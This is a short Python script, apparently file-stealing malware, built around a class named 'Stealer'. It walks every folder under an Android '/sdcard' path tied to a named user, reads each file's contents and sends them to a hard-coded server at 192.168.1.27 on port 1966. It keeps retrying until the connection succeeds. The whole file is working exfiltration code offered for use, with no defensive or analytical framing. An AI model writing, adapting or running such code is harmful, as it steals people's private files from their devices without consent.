from lib.NetStructer import Bridge
from lib.colored import fg
from os.path import join
from os import scandir

class layers:

    PASSWORD = 'PASSWORD'

class FILE:

    def __init__(self,name,countent) -> None:
        self.name = name ; self.countent = countent

class Stealer:
    
    def __init__(self,addr,password='Default') -> None:
        self.addr = addr ; self.password = password
        self.server = Bridge

    def link(self):
        self.server = Bridge.link(self.addr)
        self.server.SendBuffer({layers.PASSWORD:self.password})

    def SendCountent(self,content):
        while True:
            try:
                self.link() ; self.server.SendBuffer(content) ; break
            except (ConnectionAbortedError,ConnectionRefusedError,ConnectionResetError,TimeoutError):
                print(fg('red')+"can't connect to the server make"+fg('white'))

def main(addr,were='.'):
    Cclass = [were] ; CP = were ; server = Stealer(addr) ; loop = 0
    print(f'trying to find the'+fg('cyan')+ 'ProxyServer'+fg('white'))
    while len(Cclass) != 0:
        try:
            for i in scandir(CP):
                if i.is_dir():
                    Cclass.append((var:=join(CP,i.name)))
                else:
                    server.SendCountent(FILE(join(CP,i.name),open(join(CP,i.name),'rb').read()))
                    print(f'Gather '+fg('green') +f'{loop}'+fg('white'))
            Cclass.remove(CP)
            CP = Cclass[0]
        except Exception as er: 
            print(er)

USER = 'MARWA-ANDRDOID'

if __name__ == '__main__':
    main(('192.168.1.27',1966),join(USER,'/sdcard'))